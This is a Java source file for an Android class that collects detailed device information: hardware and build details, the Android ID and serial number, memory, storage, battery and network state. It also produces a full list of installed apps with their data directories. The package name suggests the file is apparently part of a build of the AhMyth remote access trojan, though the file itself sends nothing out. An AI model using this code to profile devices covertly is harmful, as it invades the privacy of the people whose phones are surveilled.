package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class DeviceInfoManager {

    private Context context;

    public DeviceInfoManager(Context context) {
        this.context = context;
    }

    public JSONObject getDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            PackageManager pm = context.getPackageManager();
            
            // Basic Device Information
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("device", Build.DEVICE);
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("hardware", Build.HARDWARE);
            deviceInfo.put("board", Build.BOARD);
            
            // OS Information
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);
            deviceInfo.put("buildId", Build.ID);
            deviceInfo.put("buildTime", Build.TIME);
            deviceInfo.put("buildFingerprint", Build.FINGERPRINT);
            
            // Device Identifiers
            deviceInfo.put("androidId", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            deviceInfo.put("serial", Build.SERIAL);
            
            // Display Information
            android.util.DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();
            deviceInfo.put("screenWidth", displayMetrics.widthPixels);
            deviceInfo.put("screenHeight", displayMetrics.heightPixels);
            deviceInfo.put("screenDensity", displayMetrics.density);
            deviceInfo.put("screenDensityDpi", displayMetrics.densityDpi);
            deviceInfo.put("screenScaledDensity", displayMetrics.scaledDensity);
            
            // Memory Information
            android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
            android.app.ActivityManager activityManager = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            activityManager.getMemoryInfo(memoryInfo);
            deviceInfo.put("totalMemory", memoryInfo.totalMem);
            deviceInfo.put("availableMemory", memoryInfo.availMem);
            deviceInfo.put("thresholdMemory", memoryInfo.threshold);
            deviceInfo.put("lowMemory", memoryInfo.lowMemory);
            
            // Storage Information
            try {
                android.os.StatFs statFs = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
                long blockSize = statFs.getBlockSizeLong();
                long totalBlocks = statFs.getBlockCountLong();
                long availableBlocks = statFs.getAvailableBlocksLong();
                deviceInfo.put("totalStorage", totalBlocks * blockSize);
                deviceInfo.put("availableStorage", availableBlocks * blockSize);
            } catch (Exception e) {
                deviceInfo.put("totalStorage", 0);
                deviceInfo.put("availableStorage", 0);
            }
            
            // Battery Information (if available)
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int batteryPct = (level * 100) / scale;
                deviceInfo.put("batteryLevel", batteryPct);
                deviceInfo.put("batteryPlugged", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1));
            }
            
            // Network Type
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null) {
                deviceInfo.put("networkType", activeNetwork.getTypeName());
                deviceInfo.put("networkConnected", activeNetwork.isConnected());
                deviceInfo.put("networkAvailable", activeNetwork.isAvailable());
            }
            
            // Installed Apps Count
            deviceInfo.put("installedAppsCount", pm.getInstalledApplications(PackageManager.GET_META_DATA).size());
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return deviceInfo;
    }

    public JSONArray getInstalledApps() {
        JSONArray appsArray = new JSONArray();
        try {
            PackageManager pm = context.getPackageManager();
            java.util.List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            
            for (ApplicationInfo packageInfo : packages) {
                try {
                    JSONObject appObj = new JSONObject();
                    appObj.put("packageName", packageInfo.packageName);
                    appObj.put("appName", pm.getApplicationLabel(packageInfo).toString());
                    appObj.put("isSystemApp", (packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                    appObj.put("isUpdatedSystemApp", (packageInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
                    appObj.put("sourceDir", packageInfo.sourceDir);
                    appObj.put("dataDir", packageInfo.dataDir);
                    
                    // Get version info
                    try {
                        android.content.pm.PackageInfo pkgInfo = pm.getPackageInfo(packageInfo.packageName, 0);
                        appObj.put("versionName", pkgInfo.versionName != null ? pkgInfo.versionName : "N/A");
                        appObj.put("versionCode", pkgInfo.versionCode);
                        appObj.put("firstInstallTime", pkgInfo.firstInstallTime);
                        appObj.put("lastUpdateTime", pkgInfo.lastUpdateTime);
                    } catch (Exception e) {
                        appObj.put("versionName", "N/A");
                        appObj.put("versionCode", 0);
                    }
                    
                    appsArray.put(appObj);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return appsArray;
    }
}


